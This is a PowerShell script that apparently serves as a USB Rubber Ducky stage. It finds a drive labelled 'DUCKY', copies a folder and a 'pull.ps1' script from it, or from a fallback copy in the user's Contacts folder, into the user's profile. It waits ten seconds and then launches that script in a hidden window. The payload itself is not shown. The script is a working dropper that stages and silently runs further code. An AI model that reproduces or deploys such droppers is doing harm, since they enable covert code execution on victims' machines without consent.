$currentPID = $PID
$duplicateProcess = Get-Process -Name "powershell" | Where-Object { $_.Id -ne $currentPID -and $_.CommandLine -match $MyInvocation.MyCommand.Path }

if ($duplicateProcess.Count -gt 1) {
    Write-Output "Triplicate found. Terminating new process..."
    exit 1
}


$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
$localUsername = $env:USERNAME
New-Item -Path "C:\Users\$localUsername\Document" -Name 'src' -ItemType "directory"
# New-Item -Path "C:\Users\$localUsername\Document\src" -Name 'src' -ItemType "directory"
$pullPathBeforeCopy = Get-ChildItem -Path "$driveLetter\src\*" -Filter "pull.ps1" 
$pullPathBeforeDelayCopy = Get-ChildItem -Path "C:\Users\$env:USERNAME\Contacts\src" -Recurse -Filter "pull.ps1"
$pathBeforeCopy = Get-ChildItem -Path "$driveLetter\" -Directory -Recurse -Filter "src"
$pathBeforeDelayedCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\src
$pathAfterCopy = "C:\Users\$localUsername\Document\src"


if ($driveLetter) {
    Copy-Item -Path $pathBeforeCopy -Destination $pathAfterCopy -Recurse
    Copy-Item -Path $pullPathBeforeCopy -Destination $pathAfterCopy
    Write-Host 'True'
    Write-Host $pathBeforeCopy
} else {
    Copy-Item -Path $pathBeforeDelayedCopy -Destination $pathAfterCopy -Recurse
    Copy-Item -Path $pullPathBeforeDelayCopy -Destination $pathAfterCopy
    Write-Host "False"
}


$time_in_seconds = 10
while ($time_in_seconds -gt 0) {
    #Write-Host "Time remaining: $seconds"
    Start-Sleep -Seconds 1
    $time_in_seconds--
}
Start-Process powershell -ArgumentList "-File", "$pathAfterCopy\pull.ps1" -WindowStyle Hidden

exit
